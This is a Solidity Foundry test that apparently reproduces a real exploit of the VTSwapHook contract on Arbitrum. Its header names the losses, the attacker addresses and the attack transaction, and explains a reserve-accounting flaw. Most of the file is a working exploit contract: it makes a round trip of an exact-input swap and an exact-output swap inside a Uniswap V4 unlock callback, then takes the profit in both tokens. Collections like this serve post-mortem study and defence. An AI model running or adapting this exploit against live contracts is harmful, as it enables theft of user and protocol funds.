// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4,507,034.03 vATH + 2,007,935.14 ATH
// Attacker : 0xf378840de079c70f55218cd3af99d2d81ba154ba
// Attack Contract : 0x959ec1872100eccb8c9ac355304fed81fa5d237e
// Vulnerable Contract : 0xbf4b4a83708474528a93c123f817e7f2a0637a88
// Attack Tx : https://arbiscan.io/tx/0x61a37afac7991e25391d72846819644a0938ce20ebab25ccf3a1123e1bb9459d

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xbf4b4a83708474528a93c123f817e7f2a0637a88#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2038647146098954283
//
// VTSwapHook priced a nonlinear VT/T curve through fee-adjusted amounts but updated
// its internal reserves with the full pre-fee specified amount. Alternating one
// exact-in ATH->vATH swap with one exact-output vATH->ATH swap leaves the caller
// with positive Uniswap V4 PoolManager deltas in both currencies.

address constant ATTACKER = 0xF378840dE079c70f55218cD3AF99D2D81ba154BA;
address constant ATTACK_CONTRACT = 0x959EC1872100eccb8C9AC355304fED81FA5d237E;
address constant VTSWAP_HOOK = 0xbf4b4A83708474528A93C123F817e7f2A0637a88;
address constant POOL_MANAGER = 0x360E68faCcca8cA495c1B759Fd9EEe466db9FB32;
address constant VATH = 0x24ef95c39DfaA8f9a5ADf58edf76C5b22c34Ef46;
address constant ATH = 0xc87B37a581ec3257B734886d9d3a581F5A9d056c;

// Uniswap V4 rejects swap price limits equal to TickMath's min/max bounds.
uint160 constant V4_MIN_USABLE_SQRT_PRICE = 4_295_128_740;
uint160 constant V4_MAX_USABLE_SQRT_PRICE = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IUniswapV4PoolManager {
    function unlock(
        bytes calldata data
    ) external returns (bytes memory);
    function swap(
        PoolKey memory key,
        SwapParams memory params,
        bytes calldata hookData
    ) external returns (int256);
    function take(
        address currency,
        address to,
        uint256 amount
    ) external;
}

interface IVTSwapHook {
    function reserve1() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 446_382_719;
        vm.createSelectFork("arbitrum", forkBlock);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(VATH);
        _addFundingToken(ATH);

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VTSWAP_HOOK, "VTSwapHook");
        vm.label(POOL_MANAGER, "Uniswap V4 PoolManager");
        vm.label(VATH, "vATH");
        vm.label(ATH, "ATH");
    }

    function testExploit() public balanceLog {
        uint256 vAthBefore = IERC20(VATH).balanceOf(ATTACKER);
        uint256 athBefore = IERC20(ATH).balanceOf(ATTACKER);

        // step 1: deploy a fresh helper; the trace helper was created in the tx and had no pre-existing state.
        VTSwapHookExploit exploit = new VTSwapHookExploit(ATTACKER);

        // step 2: execute one profitable V4 unlock round trip and forward both assets to the trace receiver.
        exploit.execute();

        assertGt(IERC20(VATH).balanceOf(ATTACKER), vAthBefore, "no vATH profit");
        assertGt(IERC20(ATH).balanceOf(ATTACKER), athBefore, "no ATH profit");
    }
}

contract VTSwapHookExploit {
    IUniswapV4PoolManager private constant manager = IUniswapV4PoolManager(POOL_MANAGER);
    IVTSwapHook private constant hook = IVTSwapHook(VTSWAP_HOOK);

    address private immutable receiver;
    int256 private netDelta0;
    int256 private netDelta1;

    constructor(
        address profitReceiver
    ) {
        receiver = profitReceiver;
    }

    function execute() external {
        IERC20(VATH).approve(POOL_MANAGER, type(uint256).max);
        IERC20(ATH).approve(POOL_MANAGER, type(uint256).max);
        netDelta0 = 0;
        netDelta1 = 0;
        manager.unlock("");

        uint256 vAthProfit = IERC20(VATH).balanceOf(address(this));
        uint256 athProfit = IERC20(ATH).balanceOf(address(this));
        IERC20(VATH).transfer(receiver, vAthProfit);
        IERC20(ATH).transfer(receiver, athProfit);
    }

    function unlockCallback(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == POOL_MANAGER, "only PoolManager");

        // step 3: reproduce the trace's first ATH->vATH exact-in swap using 35% of the current ATH reserve.
        uint256 exactInATH = hook.reserve1() * 35 / 100;
        int128 vAthCredit = _swap(false, -int256(exactInATH), V4_MAX_USABLE_SQRT_PRICE);

        // step 4: swap back with the first swap's vATH credit as exact-output size.
        _swap(true, int256(uint256(uint128(vAthCredit))), V4_MIN_USABLE_SQRT_PRICE);

        require(netDelta0 > 0 && netDelta1 > 0, "round trip not profitable");

        // step 5: take the positive flash-accounting deltas; no input settlement is needed.
        manager.take(VATH, address(this), uint256(netDelta0));
        manager.take(ATH, address(this), uint256(netDelta1));
        return "";
    }

    function _swap(
        bool zeroForOne,
        int256 amountSpecified,
        uint160 priceLimit
    ) private returns (int128 amount0) {
        int256 packedDelta = manager.swap(
            PoolKey({currency0: VATH, currency1: ATH, fee: 0, tickSpacing: 1, hooks: VTSWAP_HOOK}),
            SwapParams({zeroForOne: zeroForOne, amountSpecified: amountSpecified, sqrtPriceLimitX96: priceLimit}),
            ""
        );
        int128 delta0 = int128(packedDelta >> 128);
        int128 delta1 = int128(packedDelta);
        netDelta0 += delta0;
        netDelta1 += delta1;
        return delta0;
    }
}
